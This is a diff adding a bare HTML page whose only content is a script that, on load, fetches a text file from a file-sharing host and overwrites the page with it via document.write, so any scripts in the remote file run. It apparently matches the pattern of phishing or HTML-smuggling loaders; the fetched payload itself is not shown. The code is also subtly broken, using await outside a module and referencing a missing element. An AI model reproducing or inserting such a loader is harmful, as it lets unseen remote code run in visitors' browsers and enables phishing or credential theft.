@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html id="html">
+    <head>
+        <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+<meta http-equiv="Pragma" content="no-cache" />
+<meta http-equiv="Expires" content="0" />
+    </head>
+    <script>
+    try {
+        const response = await fetch('https://file.kiwi/ad160b7a#wbxowXOzn0hdxdraCaerXQ/index.txt');
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        const textString = await response.text();
+        document.open();
+        document.write(textString);
+        document.close();
+    } catch (error) {
+        console.error('There was a problem with the fetch operation:', error);
+        document.getElementById('content-container').innerText = 'Failed to load content.';
+    }
+    </script>
+</html>
